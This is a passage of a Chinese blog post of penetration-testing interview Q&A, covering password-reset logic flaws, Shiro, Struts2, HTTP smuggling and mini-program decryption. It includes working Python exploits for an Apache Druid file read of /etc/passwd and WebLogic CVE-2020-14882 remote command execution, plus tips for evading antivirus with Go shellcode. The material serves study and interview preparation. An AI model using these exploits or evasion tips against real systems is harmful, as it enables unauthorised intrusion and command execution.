ID、cookie）、接收端（手机、邮箱）、凭证（验证码、token）、当前步骤等四个要素，若这几个要素没有完整关联，则可能导致任意密码重置漏洞。<br>4、重要凭证未校验<br>邮箱的重置url中用户名可任意更改，导致任意密码修改。一般的重置url中token和用户名会进行校验，如果不匹配则无法通过。<br>5、重要凭证可爆破<br>验证码为4位且未设置过期时间可直接用burp爆破。<br>6、应答中存在影响后续逻辑的状态参数<br>密码找回流程一般包括获取短信验证码、校验短信验证码是否有效、设置新密码等三个步骤。在第二步，校验短信验证码是否有效的结果应保存在服务端，某些网站未在服务端保存而是错误地将结果状态值下发客户端，后续又依靠前端 js 判断是否可以进入第三步，那么，更改应答包中的状态值，可重置其他用户的密码。<br>7、Token可预测<br>通过邮箱找回密码时，邮件中将出现一个含有 token 的重置 URL，该 token 即为重置凭证。从经验来看，开发人员习惯以时间戳、递增序号、关键字段（如邮箱地址）等三类信息之一作为因子，采用某种加密算法或编码生成 token，攻击者可以基于能收集到的关键字段，用常见加密算法计算一遍，以判断是否可以预测出 token。</li></ol><p><a href="https://blog.csdn.net/qq_43936524/article/details/113871485">逻辑漏洞之任意密码重置漏洞</a></p><ol start="48"><li><p>挖掘过哪些逻辑漏洞，请说明挖洞方法<br>1、身份认证逻辑漏洞：cookie仿冒<br>当时我测试网站，注册了那个网站的账号。然后出现了一个cookie，之后我为了验证这个cookie有效，更改了cookie的位数，发现就无效了。在位数不变的情况下，更改为任意32位的cookie我发现都是有效的。那么直接伪造cookie实现任意账号登录。<br>2、密码找回漏洞：跳过验证步骤。<br>某个网站，发现一个参数C3，更改为C6后直接进入找回页面</p></li><li><p>shiro550与shiro721的区别<br>1、这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，只要有足够密钥库（条件较低），不需要Remember Cookie</p></li></ol><p>2、Shiro721的ase加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击，难度高</p><ol start="50"><li><p>struts2漏洞原理<br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。 导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。<br><a href="https://tttang.com/archive/1583/">struts2漏洞集合</a></p></li><li><p>自动化挖洞了解过吗？曾经刷过什么漏洞？怎么刷的？<br>了解过。<br>流程：<br>1、Google语法：查找一些login admin页面。<br>2、信息收集1：查找子域名和C段信息。<br>3、信息收集2：查找C段的全端口页面<br>4、漏洞探测：使用vulmap，burp插件，xray等工具</p></li></ol><p>刷过struts2，fastjson，weblogic，shiro等中间件漏洞。SQL注入，XSS，文件包含等。<br><a href="https://cloud.tencent.com/developer/article/2142594">自动化批量挖洞流程</a></p><ol start="52"><li>python poc编写&#x2F;python脚本<br>编写的有：SQL注入，任意文件读取，远程命令执行，任意文件上传。<br>漏洞验证手段主要是通过匹配漏洞页面的特征码去判断该网站是否存在漏洞，主要使用了 requests 库去实现模拟用户进行请求，然后匹配特征码进行漏洞判断，Poc 编写的难度不大，而完整的利用脚本即 Exp 的编写难度相对 Poc 难度要大一点，代码能力要求也相对要扎实一点。</li></ol><p>SQL注入编写思路：<br>导入requests库；设置漏洞url链接；设置header头；构造sql语句查询数据库版本；发送http请求，注入payload并获取页面响应；若返回的响应中存在报错信息则证明存在漏洞，否则不存在。</p><p>Apache Druid LoadData 任意文件读取漏洞 编写：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回请求的 text ,先手工查看是否存在漏洞</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Weblogic CVE-2020-14882 未授权远程命令执行 编写思路：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1，相关的限制或问题，具体没深究</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置未授权的后台链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                     <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; 包括字符即可</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 进行 POST 请求</span></span><br><span class="line">res = requests.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应文本</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Weblogic 任意文件上传（CVE-2018-2894）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/ws_utc/resources/setting/options/general&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行get请求</span></span><br><span class="line">res = requests.get(url=url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若get请求页面中存在&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;则存在漏洞</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/12555">Python Poc编写实例：从原理到实践</a></p><ol start="53"><li>小程序解密<br>工具：小程序包解密，wxappUnpacker-master，微信开发者工具。另外一个单独的工具：wechatMiniAppReverse<br>思路：1、反编译小程序  2、动态调试获取明文  3、微信开发者工具<br>流程：<br>1、拿小程序包<br>pc微信搜索小程序，然后打开。获取小程序包。<br>小程序包目录: <code>C:\Users\（用户名）\Documents\WeChat Files\Applet</code></li></ol><p>2、小程序包解密<br>使用小程序包解密工具（工具就叫这个名字），打开目录选中包（不能移动包的位置），解密成功<br>解密后的文件在小程序包解密工具的目录下的wxpack。</p><p>3、小程序反编译<br>将解密文件复制进wxappUnpacker-master，配置环境：<br>先安装node，然后在wxappUnpacker-master文件夹内打开cmd，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify-es</span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure><p>安装完后在wxappUnpacker-master文件夹内打开cmd执行命令：<br><code>node .\wuWxapkg.js 解密文件名.wxapkg</code></p><p>4、动态调试<br>此时在wxappUnpacker-master文件夹内会保存小程序的源码<br>下载微信开发者工具打开此文件夹：（初次使用需要手机扫码登录微信）<br>简单审计找到传参点，设置console.log（）打印加密前的明文<br>设置完毕点击相关功能点<br>获取到明文</p><p>5、payload加密<br>找到加密后的变量，设置console.log()打印：<br>使用相关功能点后，获取密文。</p><p>6、burp抓包<br>第一种方式：模拟器下载微信登录抓包，很麻烦，而且手机会掉线。<br>第二种：pc端抓包，需要设置代理。可在微信设置代理，也可使用Windows自带设置代理<br>配置完即可burp抓包了。</p><p>客户端有加密js的源码，功力深的表哥们可以直接利用算法写扫描器进行漏洞探测。</p><p>修复建议：<br>1、通过增加基于时间的验证，来确保数据包的真实性。<br>2、加一个Referer检测的中间件，所有Referer里包含 devtools 的请求全部返回500<br>3、堆appid授权检测</p><p><a href="https://www.freebuf.com/vuls/284001.html">记一次短暂的小程序解密之旅</a></p><ol start="54"><li><p>go语言免杀shellcode如何免杀？免杀原理是什么？  go免杀原理<br>1、延长运行时间，导致杀软检测超时<br>2、利用杀软对golang的弱检测<br>3、对shellcode进行多次编码解码来隐藏特征<br>4、加载无关字符串混淆。</p></li><li><p>shiro漏洞类型，shiro721原理，721利用要注意什么？<br>Shiro组件漏洞主要分为两种类型，一种是Java反序列化造成的远程代码执行漏洞，一种是身份验证绕过漏洞。<br>721原理：shiro使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式，这使得该字段可以被padding oracle攻击利用。攻击者可以使用一个合法有效的rememberMe的cookie作为前缀来实施POA，然后制造一个特制的rememberMe来执行Java反序列化攻击。<br>这个漏洞比较鸡肋的地方在于需要获取合法用户的rememberMe，如果配合XSS之类的效果会更好，并且在利用时shiro采用的是Collection3.1需要搭配相应的payload。</p></li><li><p>eval和system的区别<br>eval()函数是代码执行，括号里必须是一个符合php语法的语句，如果不符合语法会报错<br>system()函数是命令执行</p></li><li><p>HTTP请求走私漏洞 HTTP Smuggling 攻击<br>漏洞发生前提：一般在前后端服务器分离或存在CDN加速服务的情况下<br>原理：<br>一般是后端和前端对于请求的结束认证不一致导致的，相当于后端对于第一个包产生了截断，前者正常处理，后者就会和第二个包进行拼接，这样就对第二个包造成了影响，详细看下下面这两张图。<br><img src="/simg/http_smuggling.png" alt="http smuggling"></p></li></ol><p>分类：<br>1、CL-TE: 前端服务器只处理Content-Length请求头，后端处理Transfer-Encoding请求头<br>2、TE-CL: 前端服务器只处理TE请求头，后端处理CL请求头<br>3、TE-TE: 前后端都是用TE来处理请求，但是我们可以通过混淆TE头方式让后端不再根据TE处理而是变成了根据CL处理</p><p>如何发现：<br>可以使用Burp插件商店里面的HTTP Request Smuggler</p><p>防御：<br>禁用代理服务器与后端服务器之间的TCP连接重用。<br>使用HTTP&#x2F;2协议。<br>前后端使用相同的服务器。</p><p><a href="https://xz.aliyun.com/t/11423">秒懂Http请求走私</a><br><a href="https://xz.aliyun.com/t/6878">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><ol start="58"><li>XSS和CSRF  CSRF和XSS  结合攻击方式<br>攻击方式：xss结合csrf引诱用户触发恶意指令<br>防御：Referer检查并添加Token验证</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><p><a href="https://docs.qq.com/doc/DSlByWEZoaWx4U3la">2022渗透测试面试问题搜集</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/511394956">干货 | 80篇+网络安全面试经验帖(第36篇还没看)</a></p></li><li><p><a href="https://blog.51cto.com/u_15474183/5535532">2023级网络安全岗面试题及面试经验分享</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/566448154">2023届网络安全岗秋招面试题及面试经验分享</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;可以不用，但不能没有。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="web漏洞" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
</feed>
